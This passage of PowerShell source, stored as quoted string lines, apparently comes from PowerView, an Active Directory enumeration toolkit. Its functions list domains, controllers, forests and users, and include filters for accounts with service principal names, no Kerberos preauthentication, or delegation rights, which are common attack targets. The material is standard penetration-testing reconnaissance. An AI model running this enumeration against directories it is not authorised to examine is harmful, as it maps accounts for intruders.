    [Parameter(Position = 0, ValueFromPipeline = $True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        if ($PSBoundParameters['Credential']) {","","            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'","","            if ($PSBoundParameters['Domain']) {","                $TargetDomain = $Domain","            }","            else {","                # if no domain is supplied, extract the logon domain from the PSCredential passed","                $TargetDomain = $Credential.GetNetworkCredential().Domain","                Write-Verbose \"[Get-Domain] Extracted domain '$TargetDomain' from -Credential\"","            }","","            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)","","            try {","                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)","            }","            catch {","                Write-Verbose \"[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_\"","            }","        }","        elseif ($PSBoundParameters['Domain']) {","            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)","            try {","                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)","            }","            catch {","                Write-Verbose \"[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_\"","            }","        }","        else {","            try {","                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()","            }","            catch {","                Write-Verbose \"[Get-Domain] Error retrieving the current domain: $_\"","            }","        }","    }","}","","","function Get-DomainController {","\u003c#",".SYNOPSIS","","Return the domain controllers for the current (or specified) domain.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainComputer, Get-Domain  ","",".DESCRIPTION","","Enumerates the domain controllers for the current or specified domain.","By default built in .NET methods are used. The -LDAP switch uses Get-DomainComputer","to search for domain controllers.","",".PARAMETER Domain","","The domain to query for domain controllers, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER LDAP","","Switch. Use LDAP queries to determine the domain controllers instead of built in .NET methods.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-DomainController -Domain 'test.local'","","Determine the domain controllers for 'test.local'.","",".EXAMPLE","","Get-DomainController -Domain 'test.local' -LDAP","","Determine the domain controllers for 'test.local' using LDAP queries.","",".EXAMPLE","","'test.local' | Get-DomainController","","Determine the domain controllers for 'test.local'.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-DomainController -Credential $Cred","",".OUTPUTS","","PowerView.Computer","","Outputs custom PSObjects with details about the enumerated domain controller if -LDAP is specified.","","System.DirectoryServices.ActiveDirectory.DomainController","","If -LDAP isn't specified.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.Computer')]","    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True)]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [Switch]","        $LDAP,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        $Arguments = @{}","        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }","        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }","","        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {","            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }","","            # UAC specification for domain controllers","            $Arguments['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'","","            Get-DomainComputer @Arguments","        }","        else {","            $FoundDomain = Get-Domain @Arguments","            if ($FoundDomain) {","                $FoundDomain.DomainControllers","            }","        }","    }","}","","","function Get-Forest {","\u003c#",".SYNOPSIS","","Returns the forest object for the current (or specified) forest.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: ConvertTo-SID  ","",".DESCRIPTION","","Returns a System.DirectoryServices.ActiveDirectory.Forest object for the current","forest or the forest specified with -Forest X.","",".PARAMETER Forest","","The forest name to query for, defaults to the current forest.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target forest.","",".EXAMPLE","","Get-Forest -Forest external.domain","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-Forest -Credential $Cred","",".OUTPUTS","","System.Management.Automation.PSCustomObject","","Outputs a PSObject containing System.DirectoryServices.ActiveDirectory.Forest in addition","to the forest root domain SID.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('System.Management.Automation.PSCustomObject')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $Forest,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        if ($PSBoundParameters['Credential']) {","","            Write-Verbose \"[Get-Forest] Using alternate credentials for Get-Forest\"","","            if ($PSBoundParameters['Forest']) {","                $TargetForest = $Forest","            }","            else {","                # if no domain is supplied, extract the logon domain from the PSCredential passed","                $TargetForest = $Credential.GetNetworkCredential().Domain","                Write-Verbose \"[Get-Forest] Extracted domain '$Forest' from -Credential\"","            }","","            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)","","            try {","                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)","            }","            catch {","                Write-Verbose \"[Get-Forest] The specified forest '$TargetForest' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_\"","                $Null","            }","        }","        elseif ($PSBoundParameters['Forest']) {","            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)","            try {","                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)","            }","            catch {","                Write-Verbose \"[Get-Forest] The specified forest '$Forest' does not exist, could not be contacted, or there isn't an existing trust: $_\"","                return $Null","            }","        }","        else {","            # otherwise use the current forest","            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()","        }","","        if ($ForestObject) {","            # get the SID of the forest root","            if ($PSBoundParameters['Credential']) {","                $ForestSid = (Get-DomainUser -Identity \"krbtgt\" -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid","            }","            else {","                $ForestSid = (Get-DomainUser -Identity \"krbtgt\" -Domain $ForestObject.RootDomain.Name).objectsid","            }","","            $Parts = $ForestSid -Split '-'","            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'","            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid","            $ForestObject","        }","    }","}","","","function Get-ForestDomain {","\u003c#",".SYNOPSIS","","Return all domains for the current (or specified) forest.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-Forest  ","",".DESCRIPTION","","Returns all domains for the current forest or the forest specified","by -Forest X.","",".PARAMETER Forest","","Specifies the forest name to query for domains.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target forest.","",".EXAMPLE","","Get-ForestDomain","",".EXAMPLE","","Get-ForestDomain -Forest external.local","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-ForestDomain -Credential $Cred","",".OUTPUTS","","System.DirectoryServices.ActiveDirectory.Domain","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $Forest,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        $Arguments = @{}","        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }","        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }","","        $ForestObject = Get-Forest @Arguments","        if ($ForestObject) {","            $ForestObject.Domains","        }","    }","}","","","function Get-ForestGlobalCatalog {","\u003c#",".SYNOPSIS","","Return all global catalogs for the current (or specified) forest.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-Forest  ","",".DESCRIPTION","","Returns all global catalogs for the current forest or the forest specified","by -Forest X by using Get-Forest to retrieve the specified forest object","and the .FindAllGlobalCatalogs() to enumerate the global catalogs.","",".PARAMETER Forest","","Specifies the forest name to query for global catalogs.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-ForestGlobalCatalog","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-ForestGlobalCatalog -Credential $Cred","",".OUTPUTS","","System.DirectoryServices.ActiveDirectory.GlobalCatalog","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True)]","        [ValidateNotNullOrEmpty()]","        [String]","        $Forest,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        $Arguments = @{}","        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }","        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }","","        $ForestObject = Get-Forest @Arguments","","        if ($ForestObject) {","            $ForestObject.FindAllGlobalCatalogs()","        }","    }","}","","","function Get-ForestSchemaClass {","\u003c#",".SYNOPSIS","","Helper that returns the Active Directory schema classes for the current","(or specified) forest or returns just the schema class specified by","-ClassName X.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-Forest  ","",".DESCRIPTION","","Uses Get-Forest to retrieve the current (or specified) forest. By default,","the .FindAllClasses() method is executed, returning a collection of","[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.","If \"-FindClass X\" is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]","result for the specified class name is returned.","",".PARAMETER ClassName","","Specifies a ActiveDirectorySchemaClass name in the found schema to return.","",".PARAMETER Forest","","The forest to query for the schema, defaults to the current forest.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Get-ForestSchemaClass","","Returns all domain schema classes for the current forest.","",".EXAMPLE","","Get-ForestSchemaClass -Forest dev.testlab.local","","Returns all domain schema classes for the external.local forest.","",".EXAMPLE","","Get-ForestSchemaClass -ClassName user -Forest external.local","","Returns the user schema class for the external.local domain.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-ForestSchemaClass -ClassName user -Forest external.local -Credential $Cred","","Returns the user schema class for the external.local domain using","the specified alternate credentials.","",".OUTPUTS","","[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]","","An ActiveDirectorySchemaClass returned from the found schema.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True)]","        [Alias('Class')]","        [ValidateNotNullOrEmpty()]","        [String[]]","        $ClassName,","","        [Alias('Name')]","        [ValidateNotNullOrEmpty()]","        [String]","        $Forest,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    PROCESS {","        $Arguments = @{}","        if ($PSBoundParameters['Forest']) { $Arguments['Forest'] = $Forest }","        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }","","        $ForestObject = Get-Forest @Arguments","","        if ($ForestObject) {","            if ($PSBoundParameters['ClassName']) {","                ForEach ($TargetClass in $ClassName) {","                    $ForestObject.Schema.FindClass($TargetClass)","                }","            }","            else {","                $ForestObject.Schema.FindAllClasses()","            }","        }","    }","}","","","function Find-DomainObjectPropertyOutlier {","\u003c#",".SYNOPSIS","","Finds user/group/computer objects in AD that have 'outlier' properties set.","","Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  ","License: BSD 3-Clause  ","Required Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer","",".DESCRIPTION","","A 'reference' set of property names is calculated, either from a standard set preserved","for user/group/computers, or from the array of names passed to -ReferencePropertySet, or","from the property names of the passed -ReferenceObject. Every user/group/computer object","(depending on determined class) are enumerated, and for each object, if the object has a","'non-standard' property set (meaning a property not held by the reference set), the object's","samAccountName, property name, and property value are output to the pipeline.","",".PARAMETER ClassName","","Specifies the AD object class to find property outliers for, 'user', 'group', or 'computer'.","If -ReferenceObject is specified, this will be automatically extracted, if possible.","",".PARAMETER ReferencePropertySet","","Specifies an array of property names to diff against the class schema.","",".PARAMETER ReferenceObject","","Specicifes the PowerView user/group/computer object to extract property names","from to use as the reference set.","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".EXAMPLE","","Find-DomainObjectPropertyOutlier -ClassName 'User'","","Enumerates users in the current domain with 'outlier' properties filled in.","",".EXAMPLE","","Find-DomainObjectPropertyOutlier -ClassName 'Group' -Domain external.local","","Enumerates groups in the external.local forest/domain with 'outlier' properties filled in.","",".EXAMPLE","","Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier","","Enumerates computers in the current domain with 'outlier' properties filled in.","",".OUTPUTS","","PowerView.PropertyOutlier","","Custom PSObject with translated object property outliers.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.PropertyOutlier')]","    [CmdletBinding(DefaultParameterSetName = 'ClassName')]","    Param(","        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]","        [Alias('Class')]","        [ValidateSet('User', 'Group', 'Computer')]","        [String]","        $ClassName,","","        [ValidateNotNullOrEmpty()]","        [String[]]","        $ReferencePropertySet,","","        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]","        [PSCustomObject]","        $ReferenceObject,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Switch]","        $Tombstone,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')","","        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')","","        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')","","        $SearcherArguments = @{}","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }","        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","","        # Domain / Credential","        if ($PSBoundParameters['Domain']) {","            if ($PSBoundParameters['Credential']) {","                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name","            }","            else {","                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name","            }","            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'\"","        }","","        $SchemaArguments = @{}","        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }","        if ($TargetForest) {","            $SchemaArguments['Forest'] = $TargetForest","        }","    }","","    PROCESS {","","        if ($PSBoundParameters['ReferencePropertySet']) {","            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet\"","            $ReferenceObjectProperties = $ReferencePropertySet","        }","        elseif ($PSBoundParameters['ReferenceObject']) {","            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set\"","            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name","            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1","            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass\"","        }","        else {","            Write-Verbose \"[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'\"","        }","","        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {","            $Objects = Get-DomainUser @SearcherArguments","            if (-not $ReferenceObjectProperties) {","                $ReferenceObjectProperties = $UserReferencePropertySet","            }","        }","        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {","            $Objects = Get-DomainGroup @SearcherArguments","            if (-not $ReferenceObjectProperties) {","                $ReferenceObjectProperties = $GroupReferencePropertySet","            }","        }","        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {","            $Objects = Get-DomainComputer @SearcherArguments","            if (-not $ReferenceObjectProperties) {","                $ReferenceObjectProperties = $ComputerReferencePropertySet","            }","        }","        else {","            throw \"[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName\"","        }","","        ForEach ($Object in $Objects) {","            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name","            ForEach($ObjectProperty in $ObjectProperties) {","                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {","                    $Out = New-Object PSObject","                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName","                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty","                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty","                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')","                    $Out","                }","            }","        }","    }","}","","","########################################################","#","# \"net *\" replacements and other fun start below","#","########################################################","","function Get-DomainUser {","\u003c#",".SYNOPSIS","","Return all users or specific user objects in AD.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  ","",".DESCRIPTION","","Builds a directory searcher object using Get-DomainSearcher, builds a custom","LDAP filter based on targeting/filter parameters, and searches for all objects","matching the criteria. To only return specific properties, use","\"-Properties samaccountname,usnchanged,...\". By default, all user objects for","the current domain are returned.","",".PARAMETER Identity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).","Wildcards accepted. Also accepts DOMAIN\\user format.","",".PARAMETER SPN","","Switch. Only return user objects with non-null service principal names.","",".PARAMETER UACFilter","","Dynamic parameter that accepts one or more values from $UACEnum, including","\"NOT_X\" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.","",".PARAMETER AdminCount","","Switch. Return users with '(adminCount=1)' (meaning are/were privileged).","",".PARAMETER AllowDelegation","","Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'","",".PARAMETER DisallowDelegation","","Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'","",".PARAMETER TrustedToAuth","","Switch. Return computer objects that are trusted to authenticate for other principals.","",".PARAMETER PreauthNotRequired","","Switch. Return user accounts with \"Do not require Kerberos preauthentication\" set.","",".PARAMETER Domain","","Specifies the domain to use for the query, defaults to the current domain.","",".PARAMETER LDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory objects.","",".PARAMETER Properties","","Specifies the properties of the output object to retrieve from the server.","",".PARAMETER SearchBase","","The LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER SecurityMasks","","Specifies an option for examining security information of a directory object.","One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER FindOne","","Only return one result object.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".PARAMETER Raw","","Switch. Return raw results instead of translating the fields into a custom PSObject.","",".EXAMPLE","","Get-DomainUser -Domain testlab.local","","Return all users for the testlab.local domain","",".EXAMPLE","","Get-DomainUser \"S-1-5-21-890171859-3433809279-3366196753-1108\",\"administrator\"","","Return the user with the given SID, as well as Administrator.","",".EXAMPLE","","'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff","","lastlogoff                                   samaccountname","----------                                   --------------","12/31/1600 4:00:00 PM                        dfm.a","12/31/1600 4:00:00 PM                        dfm","12/31/1600 4:00:00 PM                        harmj0y","12/31/1600 4:00:00 PM                        Administrator","",".EXAMPLE","","Get-DomainUser -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\" -AdminCount -AllowDelegation","","Search the specified OU for privileged user (AdminCount = 1) that allow delegation","",".EXAMPLE","","Get-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon","","Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon","",".EXAMPLE","","Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED","","Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-DomainUser -Credential $Cred","",".EXAMPLE","","Get-Domain | Select-Object -Expand name","testlab.local","","Get-DomainUser dev\\user1 -Verbose -Properties distinguishedname","VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local","VERBOSE: [Get-DomainUser] filter string: (\u0026(samAccountType=805306368)(|(samAccountName=user1)))","","distinguishedname","-----------------","CN=user1,CN=Users,DC=dev,DC=testlab,DC=local","",".INPUTS","","String","",".OUTPUTS","","PowerView.User","","Custom PSObject with translated user property fields.","","PowerView.User.Raw","","The raw DirectoryServices.SearchResult object, if -Raw is enabled.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('PowerView.User')]","    [OutputType('PowerView.User.Raw')]","    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]","        [String[]]","        $Identity,","","        [Switch]","        $SPN,","","        [Switch]","        $AdminCount,","","        [Parameter(ParameterSetName = 'AllowDelegation')]","        [Switch]","        $AllowDelegation,","","        [Parameter(ParameterSetName = 'DisallowDelegation')]","        [Switch]","        $DisallowDelegation,","","        [Switch]","        $TrustedToAuth,","","        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]","        [Switch]","        $PreauthNotRequired,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [String[]]","        $Properties,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]","        [String]","        $SecurityMasks,","","        [Switch]","        $Tombstone,","","        [Alias('ReturnOne')]","        [Switch]","        $FindOne,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty,","","        [Switch]","        $Raw","    )","","    DynamicParam {","        $UACValueNames = [Enum]::GetNames($UACEnum)","        # add in the negations","        $UACValueNames = $UACValueNames | ForEach-Object {$_; \"NOT_$_\"}","        # create new dynamic parameter","        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])","    }","","    BEGIN {","        $SearcherArguments = @{}","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }","        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { 